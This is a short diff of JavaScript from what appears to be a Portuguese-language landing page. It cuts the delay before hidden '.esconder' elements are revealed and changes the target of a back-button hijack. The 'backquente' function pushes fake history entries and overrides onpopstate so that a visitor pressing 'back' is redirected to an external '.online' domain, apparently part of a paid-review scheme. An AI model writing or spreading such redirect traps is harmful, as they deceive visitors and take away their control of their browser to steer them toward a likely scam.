@@ -223,7 +223,7 @@ function getCookie(name) {
   
         localStorage.removeItem("utm_params");
   
-        var SECONDS_TO_DISPLAY = 680;
+        var SECONDS_TO_DISPLAY = 300;
         var CLASS_TO_DISPLAY = ".esconder";
   
         var attempts = 0;
@@ -238,7 +238,7 @@ function getCookie(name) {
         }, 0);
   
         function backquente() {
-          var back_redirect_back_link = "https://avaliadorpremiado.online/back";
+          var back_redirect_back_link = "https://avaliador-profissional.online/";
           history["pushState"]({}, "", location["href"]);
           history["pushState"]({}, "", location["href"]);
           window["onpopstate"] = function () {
